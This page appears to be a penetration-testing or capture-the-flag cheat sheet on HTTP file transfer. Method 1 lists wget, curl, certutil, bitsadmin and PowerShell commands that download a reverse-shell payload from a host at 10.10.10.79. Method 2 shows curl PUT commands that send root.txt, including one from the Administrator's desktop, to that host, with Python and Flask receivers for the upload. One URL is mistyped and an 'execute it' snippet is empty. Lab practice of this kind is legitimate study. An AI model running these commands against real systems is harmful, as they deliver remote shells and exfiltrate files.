---
layout: default
title: HTTP Transfer
permalink: /http_transfer/
---

## Transfering over HTTP

### Method 1

#### Sender

`python3 -m http.server 8000`
`python -m SimpleHTTPServer`

#### Receiver
##### Linux
`wget http://10.10.10.79:8000/rev_shell.sh -O /tmp/rev_shell.sh` <br>
`curl http://10.10.10.79:8000/rev_shell.sh -o /tmp/rev_shell.sh` <br>

##### Windows
`curl http://10.10.10.79:8000/rev_shell.exe -o rev_shell.exe` <br>
You need to mention the -o (-OutFile) flag in order to save the file. If we do not mention the flag then it will only return it as an object i.e., WebResponseObject. <br>
`certutil -urlcache -f http://10.10.10.79:8000/rev_shell.exe rev_shell.exe` <br>
`certutil -urlcache -split -f http://10.10.10.79:8000/rev_shell.exe rev_shell.exe` <br>
(The -split option in certutil is used to split large files into smaller segments to perform the file transfer.) <br>
`bitsadmin /transfer job ttp://10.10.10.79:8000/rev_shell.exe C:\Users\Public\rev_shell.exe` <br>
Bitsadmin is a command-line utility for handling Background Intelligent Transfer Service (BITS) tasks in Windows. It facilitates different file transfer operations, including downloading and uploading files.  <br>
`powershell wget http://10.10.10.79:8000/rev_shell.exe -o rev_shell.exe`
`powershell -c (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.79:8000/rev_shell.exe', 'rev_shell.exe')`
instantly execute it:
``

### Method 2

#### Sender

`curl -T root.txt http://10.10.10.79:8080`

`curl -X PUT --data-binary@"C:\Users\Administrator\Desktop\root.txt" http://10.10.10.79:8080/root.txt`

#### Receiver

python3 -m SimpleHTTPPutServer 8080

[SimpleHTTPPutServer.py](https://gist.github.com/fabiand/5628006)

```
# python3 -m SimpleHTTPPutServer 8080

from http.server import HTTPServer, SimpleHTTPRequestHandler

class PutHTTPRequestHandler(SimpleHTTPRequestHandler):
    def do_PUT(self):
        print(self.headers)
        length = int(self.headers["Content-Length"])
        path = self.translate_path(self.path)
        with open(path, "wb") as dst:
            dst.write(self.rfile.read(length))
        self.send_response(200)
        self.end_headers()


def run(server_class=HTTPServer, handler_class=PutHTTPRequestHandler):
    server_address = ('', 8000)
    httpd = server_class(server_address, handler_class)
    httpd.serve_forever()

if __name__ == '__main__':
    run()
```

Or

`python3 webserver.py

webserver.py
```
from flask import Flask, request
import os

app=Flask(__name__)

@app.route('/root.txt', methods=['PUT'])
def upload_file():
    file=request.data
    with open('root.txt','wb') as f:
        f.write(file)
    return "File Uploaded successfully", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0',port=8080)

```
